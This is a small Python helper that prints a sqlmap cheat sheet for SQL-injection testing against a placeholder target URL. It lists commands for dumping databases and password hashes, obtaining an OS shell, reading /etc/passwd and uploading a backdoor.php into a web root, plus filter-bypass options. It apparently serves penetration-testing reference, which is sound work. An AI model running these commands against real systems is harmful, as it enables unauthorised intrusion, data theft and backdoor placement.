def show_sqlmap_help():
    print("\n=== SQLMap Commands with Logic ===\n")

    commands = [
        # Basic Usage
        ("sqlmap -u 'http://target/page.php?id=1' --batch", "Auto-detect & exploit injection point."),
        ("sqlmap -u 'http://target/page.php?id=1' --dbs", "Enumerate available databases."),
        ("sqlmap -u 'http://target/page.php?id=1' -D testdb --tables", "List tables in database."),
        ("sqlmap -u 'http://target/page.php?id=1' -D testdb -T users --columns", "List columns in table."),
        ("sqlmap -u 'http://target/page.php?id=1' -D testdb -T users --dump", "Dump all data from table."),

        # Using Requests
        ("sqlmap -r request.txt --batch", "Use saved HTTP request file instead of URL."),
        ("sqlmap --cookie='SESSION=xyz' -u 'http://target/item?id=1'", "Inject using a specific cookie."),
        ("sqlmap --user-agent='CustomUA' -u 'http://target/item?id=1'", "Custom user-agent header."),
        ("sqlmap --proxy='http://127.0.0.1:8080' -u 'http://target/item?id=1'", "Route traffic via proxy."),

        # Enumeration
        ("sqlmap -u '...' --users", "List DB users."),
        ("sqlmap -u '...' --passwords", "Dump DBMS password hashes."),
        ("sqlmap -u '...' --roles", "Enumerate DB roles."),
        ("sqlmap -u '...' --privileges", "List DB user privileges."),
        ("sqlmap -u '...' --current-user", "Show current DB user."),
        ("sqlmap -u '...' --current-db", "Show current DB name."),

        # Exploitation
        ("sqlmap -u '...' --os-shell", "Get OS command shell."),
        ("sqlmap -u '...' --os-pwn", "Attempt privilege escalation + shell."),
        ("sqlmap -u '...' --file-read=/etc/passwd", "Read file from host."),
        ("sqlmap -u '...' --file-write=/tmp/backdoor.php --file-dest=/var/www/html/backdoor.php",
         "Upload file to target server."),
        ("sqlmap -u '...' --dump-all", "Dump entire DB content."),

        # Bypassing Filters
        ("sqlmap -u '...' --tamper=space2comment", "Bypass filters using tamper scripts."),
        ("sqlmap -u '...' --level=5 --risk=3", "Perform deep, risky tests."),
        ("sqlmap -u '...' --time-sec=10", "Adjust time delay for time-based injections."),
    ]

    for cmd, logic in commands:
        print(f"{cmd}\n    # {logic}\n")
